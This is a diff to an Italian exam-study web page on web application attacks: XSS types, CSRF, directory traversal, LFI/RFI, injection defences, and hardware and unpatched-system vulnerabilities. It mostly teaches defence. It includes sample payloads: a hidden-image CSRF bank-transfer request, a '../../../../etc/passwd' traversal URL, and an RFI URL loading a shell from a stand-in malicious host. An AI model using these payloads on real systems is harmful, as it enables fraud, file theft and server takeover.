+    <li><strong>Document Object Model (DOM)</strong>: La struttura ad albero creata dal browser che rappresenta gerarchicamente gli elementi HTML di una pagina. Attraverso il DOM, i client-side script in JavaScript possono leggere, modificare o eliminare dinamicamente testi, nodi e attributi in tempo reale (ad esempio manipolando la proprietà <code>document.write()</code> o <code>innerHTML</code>).</li>
+  </ul>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Le 3 Tipologie Chiave di XSS (Come operano sul client)</h4>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+    <dt>1. Stored XSS / Persistent XSS (Persistente)</dt>
+    <dd>Lo script dannoso viene **salvato permanentemente** nel database del server (ad esempio, inserendolo in un messaggio di un forum, in un commento a un post o in un profilo utente). Quando un qualsiasi visitatore apre quella risorsa, il server estrae il codice malevolo dal database e lo include nella pagina inviata al client. Il browser del client, ritenendo che il codice provenga legittimamente dal server del sito fidato, lo esegue automaticamente. È la forma più distruttiva perché colpisce indiscriminatamente chiunque navighi sulla pagina compromessa.</dd>
+
+    <dt>2. Reflected XSS / Non-Persistent XSS (Non persistente)</dt>
+    <dd>Lo script malevolo non viene memorizzato sul server. L'attaccante invia un link appositamente strutturato alla vittima (ad esempio tramite phishing o social engineering). Questo link contiene un parametro URL che racchiude il codice dannoso (detto <strong>reflected payload</strong>). Quando la vittima clicca sull'URL, la richiesta HTTP inviata al server contiene il payload; il server, se vulnerabile, risponde "riflettendo" il payload tale e quale all'interno della pagina HTML di risposta. Il browser riceve la risposta, interpreta lo script iniettato e lo esegue localmente.</dd>
+
+    <dt>3. DOM-based XSS (Dinamico)</dt>
+    <dd>In questa variante, l'attacco avviene interamente all'interno del browser della vittima senza passare dal codice dinamico del server. Gli script client-side legittimi dell'applicazione gestiscono i dati inviati dall'utente (es. leggendo parametri da <code>window.location.search</code>) e li scrivono direttamente nel <strong>Document Object Model (DOM)</strong> in modo insicuro. Di conseguenza, il payload dannoso viene eseguito localmente a causa della cattiva gestione dinamica degli elementi all'interno del client, senza che le risposte crude del server contengano necessariamente il tag malevolo.</dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Cosa può fare l'hacker? Obiettivi pratici della Client-Side Browser Exploitation</h4>
+  <p>
+    Molti ritengono (sbagliando) che il codice eseguito sul client non sia dannoso per il server. In realtà, poiché la vittima ha un rapporto di fiducia verso il <strong>trusted site</strong>, l'esecuzione di script arbitrari nel suo contesto di sicurezza (<strong>browser session exploitation</strong>) dà all'attaccante ampi poteri:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 25px;">
+    <li><strong>Stealing the user’s data (Furto dei dati utente)</strong>: Lo script iniettato può leggere i <strong>Session Cookie</strong> o i <strong>Session Token</strong> archiviati in locale e non protetti da restrizioni <code>HttpOnly</code>, trasmettendoli silenziosamente al server dell'hacker. Questo permette il furto d'identità immediato dell'account (Session Hijacking).</li>
+    <li><strong>Defacing the trusted website (Sfigurare il sito fidato)</strong>: L'hacker manipola il DOM per alterare completamente l'aspetto visuale del sito legittimo (Defacement). Ne sostituisce i loghi, mostra messaggi minatori o sovrappone moduli di inserimento credenziali fittizi per fare phishing.</li>
+    <li><strong>Intercepting data or communications (Intercettazione dei dati o comunicazioni)</strong>: Lo script dannoso si comporta come un keylogger o un intercettore locale, memorizzando tutti i dati sensibili immessi nel form (es. carte di credito o password) e le comunicazioni via chat del browser della vittima, esfiltrando in tempo reale.</li>
+    <li><strong>Installing malware on client’s system (Installazione di malware)</strong>: Sfruttando lacune di sicurezza intrinseche del browser non aggiornato o dei suoi plugin (<strong>client-side browser exploitation</strong>), lo script può indurre un download di file dannosi, inducendo la macchina della vittima ad avviare inconsapevolmente trojan, spyware o adware (attacco <em>drive-by download</em>).</li>
+  </ul>
+
   <div class="pitfall">
-    <strong>ATTENZIONE — XSS vs SQLi: qual è il bersaglio?</strong><br>
-    <strong>SQLi</strong>: bersaglio = database del server → l'attaccante manipola
-    le query SQL per leggere/modificare i dati nel DB.<br>
-    <strong>XSS</strong>: bersaglio = browser del client → l'attaccante inietta
-    script che vengono eseguiti nel browser degli utenti.<br>
-    Nello scenario  vedi <code>&lt;script&gt;function(send_info)&lt;/script&gt;</code>
-    nei log → è <strong>XSS</strong>, non SQLi: è JavaScript iniettato, non comandi SQL.
-    Mitigazione XSS: <strong>input validation</strong>.
+    <strong>ATTENZIONE — XSS vs SQLi: differenze diagnostiche</strong><br>
+    <strong>SQLi</strong>: bersaglio = database del server → l'attaccante manipola query SQL per interrogare o distruggere dati memorizzati.<br>
+    <strong>XSS</strong>: bersaglio = browser del client → l'attaccante sfrutta la fiducia dei client nel <strong>trusted website</strong> per eseguire script nel browser.<br>
+    Nello scenario d'esame vedi stringhe come <code>&lt;script&gt;</code>, <code>onload=</code> o <code>onerror=</code> inserite in moduli → è sempre un tentativo di <strong>XSS</strong>.<br>
+    La protezione contro XSS richiede la rigorosa <strong>input validation</strong> unita all'<strong>output encoding / input sanitization</strong> (es. rimuovere i caratteri speciali prima di rimetterli a schermo).
   </div>
 
-  <h3 id="dir-traversal">Directory traversal (Path traversal)</h3>
+  <h3 id="xsrf">Cross-Site Request Forgery (XSRF / CSRF)</h3>
   <p>
-    Il <strong>directory traversal</strong> (anche noto come <em>path traversal</em>)
-    permette a un attaccante di accedere a file e directory al di fuori della cartella
-    web root del server, navigando verso l'alto nella gerarchia del filesystem usando
-    sequenze come <code>../</code>. Se l'applicazione non sanitizza i percorsi nei
-    parametri di input, l'attaccante può leggere file sensibili del sistema operativo.
+    Espressione speculare e completamento ideale del Cross-Site Scripting (XSS), il <strong>Cross-Site Request Forgery (XSRF o CSRF)</strong> è una vulnerabilità web in cui l'attaccante inganna il browser di un utente autenticato inducendolo a compiere azioni non volute a proprio nome su un'applicazione web fidata. È storicamente noto anche come attacco "one-click" o di session riding.
   </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">La Meccanica del Vettore d'Attacco in Background</h4>
   <p>
-    Il pattern classico è: <code>GET ../../../../etc/passwd</code> —
-    quattro livelli su dalla web root per raggiungere <code>/etc/passwd</code>,
-    il file delle password di sistema Unix/Linux. Ogni <code>../</code> sale di un
-    livello nella gerarchia del filesystem.
+    Diversamente dall'XSS (in cui l'attaccante inietta script dinamici direttamente sul sito fidato), in un attacco CSRF l'attaccante allestisce e controlla un sito esterno maligno. Sfruttando la logica intrinseca del protocollo HTTP e il comportamento automatico dei browser, l'attaccante avvia l'offensiva:
   </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 15px;">
+    <li>La vittima ha una <strong>web browser session</strong> attiva su un sito bancario (es. <code>banca-trusted.com</code>) e memorizza un <strong>Session Cookie</strong> di autenticazione valido nel proprio browser.</li>
+    <li>L'attore malevolo invia alla vittima un link che la indirizza ad un altro portale da lui gestito (es. <code>sito-esca.com</code>).</li>
+    <li>All'apertura di <code>sito-esca.com</code>, un codice truffaldino o un tag HTML invisibile (es. un modulo nascosto con invio automatico JavaScript o un'immagine malevola taggata come <code>&lt;img src="https://banca-trusted.com/api/trasferisci?importo=5000&amp;dest=hacker" /&gt;</code>) innesca un caricamento o una <strong>form submission</strong> invisibile verso il sito bersaglio.</li>
+    <li>Il browser della vittima esegue diligentemente la richiesta in background inviandola a <code>banca-trusted.com</code>. Trattandosi di una richiesta instradata verso quel dominio, il browser, per design standard di sicurezza, <strong>allega automaticamente il cookie di sessione della vittima</strong>.</li>
+    <li>Il server della banca riceve la sottomissione del modulo, valida il session cookie autenticato, e ritiene che la transazione sia stata intenzionalmente inoltrata dal titolare, completando il trasferimento monetario illegittimo.</li>
+  </ul>
+
+  <div class="pitfall">
+    <strong>CONFRONTO ESSENZIALE PER L'ESAME — XSS vs XSRF/CSRF:</strong><br>
+    <strong>XSS (Cross-Site Scripting)</strong>: Sfrutta la fiducia che l'utente ripone in un <strong>trusted site</strong>. L'hacker inietta script malevoli (JavaScript) che il browser della vittima esegue all'interno della pagina legittima, permettendo il furto di dati (es. esfiltrare cookie non protetti) o il defacing.<br><br>
+    <strong>XSRF / CSRF (Cross-Site Request Forgery)</strong>: Sfrutta la fiducia che il backend di un sito web ripone nel browser dell'utente. L'hacker costringe il browser dell'utente a trasmettere richieste/comandi non voluti al sito fidato, trascinando con sé automaticamente il session cookie (senza che l'hacker possa necessariamente leggerne il contenuto o intercettarne i dettagli privati).
+  </div>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Le Difese Cruciali per CSRF/XSRF</h4>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>User-specific Anti-CSRF Tokens (Token Unici per Utente)</dt>
+    <dd>La contromisura più efficace consiste nell'associare ad ogni modulo d'invio o form un token segreto inserito server-side dall'applicazione. Questo token deve essere generato in modo univoco per quella specifica sessione utente con un elevato livello di <strong>randomness</strong> (casualità). All'atto di ogni POST o sottomissione di modulo, il server confronta il token trasmesso con quello in sessione. Un sito terzo maligno non può indovinare o leggere tale token, rendendo vane le form submissions clandestine.</dd>
+
+    <dt>Current Password Verification (Verifica della Password)</dt>
+    <dd>Per azioni ad altissimo impatto strategico (come la variazione dell'indirizzo email di recupero, la sostituzione della password, o i bonifici finanziari), l'applicazione deve richiedere la digitazione della password corrente o il superamento di una Multi-Factor Authentication (MFA). Poiché il sito dell'attaccante non può indovinare o precompilare la password della vittima, l'azione fallirà sul nascere sul server.</dd>
+
+    <dt>SameSite cookies</dt>
+    <dd>Configurando il parametro dei cookie di sessione su <code>SameSite=Strict</code> o <code>SameSite=Lax</code>, si istruisce il browser del client a non allegare mai tali cookie alle richieste HTTP generate o originate da siti esterni di terze parti (come <code>sito-esca.com</code>), bloccando di fatto il CSRF sul piano di sicurezza del browser.</dd>
+  </dl>
+
+  <h3 id="dir-traversal">Directory Traversal (Path Traversal) e File Inclusion</h3>
+  <p>
+    La gestione non sicura dell'input fornito dall'utente per recuperare o caricare risorse sul filesystem del server è una delle principali vulnerabilità delle applicazioni web. Due tecniche cruciali e strettamente correlate a questo riguardo sono il <strong>Directory Traversal</strong> e il <strong>File Inclusion (LFI e RFI)</strong>.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">1. Directory Traversal (Path Traversal / Attraversamento delle directory)</h4>
+  <p>
+    Il <strong>Directory Traversal</strong> permette a un attaccante di accedere a file e cartelle arbitrari memorizzati sul sistema operativo del server, al di fuori della cartella radice web (<em>web root</em>, solitamente <code>/var/www/html</code> o simile).
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Il Meccanismo d'Attacco</dt>
+    <dd>
+      L'attaccante inserisce nel percorso di un parametro di input sequenze di caratteri speciali di risalita gerarchica come <code>../</code> (o <code>..\</code> nei sistemi Windows). Queste sequenze dicono al sistema operativo di salire di un livello nella struttura delle cartelle.
+    </dd>
+    <dt>Esempio di Scenario Reale Semplice</dt>
+    <dd>
+      Immaginiamo un sito web che carica le immagini in modo dinamico tramite un URL come questo:
+      <br><code>https://sito-vulnerabile.it/view_image.php?file=logo.png</code>
+      <br>L'applicazione riceve il parametro <code>file</code> e lo concatena direttamente al percorso locale:
+      <br><code>/var/www/html/images/logo.png</code>
+      <br><br>
+      <strong>L'Attacco:</strong> L'attore ostile sostituisce <code>logo.png</code> con una sequenza di risalita per leggere il file contenente gli utenti registrati su Linux:
+      <br><code>https://sito-vulnerabile.it/view_image.php?file=../../../../etc/passwd</code>
+      <br>Il server esegue internamente della logica di routing, risolvendo il percorso unendo i due pezzi:
+      <br><code>/var/www/html/images/../../../../etc/passwd</code>
+      <br>Poiché ogni <code>../</code> sale di un livello, il percorso si risolve graficamente in:
+      <br><code>/etc/passwd</code>, che è il file di sistema contenente l'elenco dei profili utente di Linux. Il server legge il file e lo mostra a schermo all'attaccante.
+    </dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">2. File Inclusion (Inclusione di file locali e remoti)</h4>
+  <p>
+    Mentre il Directory Traversal punta semplicemente a <em>leggere o scaricare</em> file di sistema, la vulnerabilità di <strong>File Inclusion</strong> si spinge oltre: costringe il server a <strong>caricare ed eseguire</strong> codice inserito in un file all'interno del flusso applicativo del server web.
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Local File Inclusion (LFI - Inclusione di file locali)</dt>
+    <dd>
+      Si verifica quando un'applicazione web include un file presente localmente sul server stesso, eseguendolo come codice (es. codice scripting PHP o moduli runtime).
+      <br><strong>• Esempio di Scenario Reale:</strong> Supponiamo che una pagina carichi i template di visualizzazione dinamicamente:
+      <br><code>https://sito.it/index.php?page=contatti.html</code>
+      <br>Se il server ha un modulo di caricamento file (<em>file upload</em>) per inserire una foto del profilo (es. <code>avatar.jpg</code>), e un attaccante riesce a camuffare dello script PHP dannoso dentro l'immagine e a fare l'upload locale su <code>/uploads/avatar.jpg</code>, potrà poi forzare l'LFI richiamando l'immagine tramite il parametro vulnerabile:
+      <br><code>https://sito.it/index.php?page=uploads/avatar.jpg</code>
+      <br>Il server includerà ed eseguirà il codice PHP fuggiasco nascosto nella foto, concedendo all'attaccante una shell di comando o privilegi d'esecuzione interni.
+    </dd>
+
+    <dt>Remote File Inclusion (RFI - Inclusione di file remoti)</dt>
+    <dd>
+      Variante letale dell'inclusione di file in cui l'applicazione, a causa di impostazioni di configurazione insicure (es. <code>allow_url_include = On</code> in PHP), è disposta a prelevare ed eseguire codice sorgente ospitato su un <strong>server esterno</strong> gestito completamente dall'attaccante.
+      <br><strong>• Esempio di Scenario Reale:</strong> L'attaccante manipola il parametro inserendo un intero URL Internet di sua proprietà:
+      <br><code>https://sito.it/index.php?page=http://un-sito-cattivo.com/shell-maliziosa.txt</code>
+      <br>Il server bersaglio effettuerà una richiesta HTTP per scaricare in background il file <code>shell-maliziosa.txt</code> e lo eseguirà immediatamente a livello di backend. Questo consente all'attaccante di assumere il controllo totale del server all'istante senza bisogno di caricare localmente alcun file.
+    </dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 20px; margin-bottom: 5px;">Misure di Prevenzione e Mitigazione</h4>
+  <p>
+    La difesa contro l'esposizione di file system e inclusioni involontarie si basa su controlli rigidi a livello applicativo e sistemico:
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 25px;">
+    <li><strong>Validazione rigorosa e Whitelisting (Lista di controllo fissa)</strong>: Non accettare percorsi di file arbitrari passati dall'utente. Configurare una whitelist rigida delle sole pagine/risorse permesse (es: se l'utente inserisce 'home', carica la pagina predefinita corrispondente, altrimenti rifiuta).</li>
+    <li><strong>Uso di Identificatori Indiretti (Reference Maps)</strong>: Invece di passare il nome del file, passare codici identificativi numerici o chiavi fisse (es: <code>?page=1</code> per la home, <code>?page=2</code> per contatti).</li>
+    <li><strong>Sanitizzazione vigorosa dei metacaratteri</strong>: Rimuovere o bloccare l'input dell'utente che contiene barre (<code>/</code>, <code>\</code>), puntini (<code>.</code>) o sequenze d'escape (<code>%2e%2e%2f</code>). Utilizzare funzioni native del linguaggio che estraggono solo il nome base del file (es: <code>basename()</code>).</li>
+    <li><strong>Sandboxing e Isolamento dei Privilegi</strong>: Eseguire il processo del server web come utente a bassi privilegi (es: <code>www-data</code>) per limitare la lettura di file critici quali <code>/etc/shadow</code> o file di configurazione con credenziali di amministrazione.</li>
+    <li><strong>Hardening delle impostazioni di sistema</strong>: Nelle configurazioni dei motori applicativi, disabilitare opzioni pericolose come <code>allow_url_fopen</code> e <code>allow_url_include</code> per rendere strutturalmente impossibile l'RFI.</li>
+  </ul>
+
+  <h3 id="injection-mitigation">Strategie di Protezione: Mitigare gli Attacchi di Iniezione</h3>
+  <p>
+    La difesa contro qualsiasi attacco di iniezione (SQL, XML, Command o Code Injection) deve poggiare su due pilastri fondamentali da implementare sistematicamente nel ciclo di vita dello sviluppo sicuro del software:
+  </p>
+  <dl class="termlist">
+    <dt>Use Input Validation (Validazione dell'Input)</dt>
+    <dd>
+      Consiste nel verificare proattivamente che l'input ricevuto dall'esterno si adegui esattamente a formati, dimensioni e schemi prestabiliti.
+      <ul style="margin-left: 20px; margin-top: 6px; margin-bottom: 12px;">
+        <li><em>Whitelisting</em>: Accettare solo caratteri o pattern predefiniti e ben conosciuti (es: numeri per un codice postale, lettere alfabetiche per un nome). Qualsiasi input non conforme viene rifiutato all'istante dall'applicazione.</li>
+        <li><em>Limiti di Lunghezza</em>: Impedire immissioni di dati eccessivamente grandi che possam indurre buffer overflow o anomalie di buffer applicative.</li>
+      </ul>
+      <strong>Esempio di RegEx Whitelist in Javascript:</strong>
+      <pre style="margin-bottom: 20px;"><code>// Permette solo caratteri alfanumerici e lettere accentate, dimensione da 3 a 20 caratteri.
+// Se l'input contiene metacaratteri come &lt;, &gt;, ;, ' l'espressione regolare fallisce.
+const usernameInput = req.body.username;
+const safePattern = /^[a-zA-Z0-9àèìòùÀÈÌÒÙ\s]{3,20}$/;
+
+if (!safePattern.test(usernameInput)) {
+  return res.status(400).send("Immissione rifiutata: caratteri non consentiti o lunghezza errata!");
+}</code></pre>
+    </dd>
+
+    <dt>Sanitize Data (Sanitizzazione dei dati / Output Encoding)</dt>
+    <dd>
+      Consiste nel trattare attivamente i dati ripulendoli da metacaratteri ostili o convertendoli prima che vengano inclusi o interpretati da parser della base dati, del browser o del server.
+      <ul style="margin-left: 20px; margin-top: 6px; margin-bottom: 12px;">
+        <li><em>Sanitizzazione (Input Scrubbing)</em>: Rimuovere o eliminare sequenze ed elementi potenzialmente distruttivi (rimuovere sequenze <code>../</code> per directory traversal o estirpare tag <code>&lt;script&gt;</code> per XSS).</li>
+        <li><em>Codifica (Output Encoding)</em>: Sostituire i caratteri di sintassi con corrispondenti entità inerti prima che siano proiettati a schermo o interpretati dal client (ad esempio convertire il codice HTML <code>&lt;</code> nell'entità visiva innocua e sicura <code>&amp;lt;</code>, <code>&gt;</code> in <code>&amp;gt;</code>, o <code>'</code> in <code>&amp;#39;</code>).</li>
+      </ul>
+      <strong>Esempio di Output Encoding (HTML Escape prevenzione XSS):</strong>
+      <pre><code>function sanitizeForHTML(rawString) {
+  return rawString
+    .replace(/&amp;/g, "&amp;amp;")   // Sostituisce la e commerciale
+    .replace(/&lt;/g, "&amp;lt;")    // Disattiva l'apertura dei tag &lt;
+    .replace(/&gt;/g, "&amp;gt;")    // Disattiva la chiusura dei tag &gt;
+    .replace(/"/g, "&amp;quot;")  // Disattiva gli attributi virgolette
+    .replace(/'/g, "&amp;#x27;"); // Disattiva l'apice singolo
+}
+
+// Un input malevolo come: &lt;script&gt;alert(1)&lt;/script&gt;
+// Diventa la stringa innocua: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; che il browser non eseguirà!</code></pre>
+    </dd>
+  </dl>
 </section>
 
 
@@ -320,6 +871,26 @@
     <strong>Firmware</strong>.
   </div>
 
+  <h3 id="hardware-vulnerabilities">Hardware Vulnerabilities (Vulnerabilità Hardware)</h3>
+  <p>
+    Sotto l'ombrello delle minacce fisiche, le <strong>vulnerabilità hardware</strong> comprendono bachi, debolezze sistemiche ed errori di progettazione o fabbricazione localizzati direttamente nei circuiti fisici, nei processori (CPU), nelle memorie (RAM) o lungo la catena di distribuzione dei dispositivi fisici (Supply Chain).
+  </p>
+  <p>
+    Questi difetti sono di natura fisica e strutturale, il che significa che:
+  </p>
+  <ul style="margin-left: 20px; margin-bottom: 24px; line-height: 1.6;">
+    <li>Le vulnerabilità hardware sono intrinseche al design silicio del componente; una semplice formattazione o reinstallazione del sistema operativo <strong>non risolve affatto</strong> il problema.</li>
+    <li>La mitigazione richiede spesso la sostituzione fisica totale del componente (costosa e complessa in ambienti corporate), l'applicazione di patch microcodice di basso livello alla CPU, l'aggiornamento costante dei BIOS/UEFI o l'adozione di modifiche software compensative che pur risolvendo il problema drastico tendono a degradare la velocità operativa del processore.</li>
+  </ul>
+  <dl class="termlist">
+    <dt>Attacchi di canale laterale della CPU (Spectre e Meltdown)</dt>
+    <dd>Vulnerabilità logiche presenti a livello del design del silicio di molti processori moderni. Sfruttando meccanismi dinamici di ottimizzazione come l'<em>esecuzione speculativa</em> e la cache memory, permettono ad applicativi malware non privilegiati di aggirare l'isolamento della memoria interna ed estrarre chiavi crittografiche o segreti core del kernel a runtime.</dd>
+    <dt>Rowhammer (Manipolazione fisica della RAM)</dt>
+    <dd>Scenografia di vulnerabilità fisica legata all'alta densità dei chip DRAM moderni. Accedendo e stimolando ripetutamente ad altissima frequenza determinate righe di celle di memoria fisica si induce una fluttuazione elettromagnetica di carica che corrompe ed inverte i bit delle righe fisiche adiacenti (bit-flipping), permettendo a processi standard di scalare i propri privilegi o mandare in crash l'host.</dd>
+    <dt>Manomissione della Supply Chain (Hardware Trojans)</dt>
+    <dd>Iniezione silente di microscopici circuiti estranei o chip spia malevoli (hardware backdoors) assemblati sui dispositivi o schede madri durante la logistica, spedizione o produzione. Consentono bypass di sicurezza fisici o la trasmissione aerea furtiva di dati, non rilevabili dal comune software AV.</dd>
+  </dl>
+
   <h3 id="eol-legacy">End-of-life (EOL) / Legacy</h3>
   <p>
     Un sistema o un'applicazione raggiunge lo stato di <strong>End-of-Life (EOL)</strong>
@@ -344,6 +915,14 @@
     Il vendor smette di patchare: qualsiasi vulnerabilità scoperta d'ora in poi rimane
     aperta per sempre.
   </div>
+
+  <h3 id="unpatched-systems">Unpatched Systems (Sistemi non patchati)</h3>
+  <p>
+    I <strong>sistemi non patchati (unpatched systems)</strong> sono sistemi e host attivi in produzione che eseguono software strutturalmente obsoleti o con debolezza nota privi degli opportuni aggiornamenti di sicurezza rilasciati dal vendor originario.
+  </p>
+  <p>
+    A differenza dei dispositivi End-of-Life per i quali non è più ingegnerizzata alcuna patch, i sistemi non patchati indicano un fallimento logico-organizzativo nel ciclo di <strong>Patch Management</strong> dell'impresa. Gli aggressori prediligono colpire queste macchine poiché il tempo di reazione dell'azienda nell'installare le patch lascia una finestra d'opportunità ottimale in cui fare leva su exploit stabili o pubblici (known exploits) senza richiedere ingegno sofisticato.
+  </p>
 </section>
 
 
